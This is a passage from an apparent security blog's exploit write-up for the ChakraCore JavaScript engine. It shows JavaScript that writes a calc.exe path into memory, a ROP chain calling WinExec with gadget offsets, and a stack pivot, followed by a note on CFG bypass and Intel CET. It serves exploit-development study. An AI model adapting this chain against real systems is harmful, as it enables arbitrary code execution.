&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// C:\Windows\System32\calc.exe
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">cmdExe&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">0x575c3a43&lt;/span>, &lt;span style="color:#ae81ff">0x6f646e69&lt;/span>, &lt;span style="color:#ae81ff">0x535c7377&lt;/span>, &lt;span style="color:#ae81ff">0x65747379&lt;/span>, &lt;span style="color:#ae81ff">0x5c32336d&lt;/span>, &lt;span style="color:#ae81ff">0x636c6163&lt;/span>, &lt;span style="color:#ae81ff">0x6578652e&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">cmdExe&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#a6e22e">i&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write32&lt;/span>(&lt;span style="color:#a6e22e">exeLoc&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#a6e22e">cmdExe&lt;/span>[&lt;span style="color:#a6e22e">i&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we&amp;rsquo;ll come to the actual ROP chain. Following the x64 Windows calling convention, the two parameters for the &lt;code>WinExec&lt;/code> function should be passed into the RCX and RDX registers. For this we require 2 ROP gadgets with which we can set the RCX and RDX registers. These setup our parameters which will be used in the execution of &lt;code>WinExec&lt;/code>. Once the parameters are filled with the correct data, we pass execution directly to &lt;code>WinExec&lt;/code>. The full ROP chain can be found in the code snippet below.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//0x180196522: pop rdx ; ret ; (1 found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">rop&lt;/span>, &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x196522&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">rop&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x08&lt;/span>, &lt;span style="color:#ae81ff">0x1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//0x180012df8: pop rcx ; ret ; (1 found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">rop&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x12df8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">rop&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x18&lt;/span>, &lt;span style="color:#a6e22e">exeLoc&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//call WinExec - kernelbase + 0x5f0e0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">rop&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#a6e22e">kernel32_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x5f0e0&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we need a stack pivot which will overwrite the return stack address. This is simply done using the following 2 line ROP chain&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//0x180007cde: pop rsp ; ret ; (1 found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">stackAddr&lt;/span>, &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x7cde&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">stackAddr&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#a6e22e">rop&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The following video shows this proof of concept running&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="poc.mp4"
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="poc.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;h2 id="possible-enhancements">Possible enhancements
&lt;/h2>&lt;p>The exploit built here serves only as a proof of concept, and can obviously be improved in several ways.&lt;/p>
&lt;p>Although the code runs in ChakraCore, where we&amp;rsquo;re using the standalone &lt;code>ch.exe&lt;/code>, the ROP chain at the end does not handle continuation of the executable to run. Since ChakraCore happens to be JavaScript engine for the old Microsoft Edge, a proper exploit should handle proper restoration of the stack frame.&lt;/p>
&lt;p>The CFG bypass used here exploits the fact that CFG lacks backward flow control. Technologies such as Intel&amp;rsquo;s Control-flow Enforcement Technologies (CET) offer both forward and backward flow control. Intel CET handles backward flow control through the concept of a Shadow Stack. With Shadow Stacks, two stacks are used per thread, with the first stack being used as a normal stack and the second stack containing only return addresses. When returning from a function, if the address on the normal stack does not match the address in the shadow stack, meaning it has been modified, the application is terminated. Such technologies would force us to use other CFG bypasses such as data only attacks&lt;/p></description></item><item><title>Search</title><link>https://execc0de.github.io/search/</link><pubDate>Sun, 13 Oct 2024 22:50:56 +0200</pubDate><guid>https://execc0de.github.io/search/</guid><description/></item></channel></rss>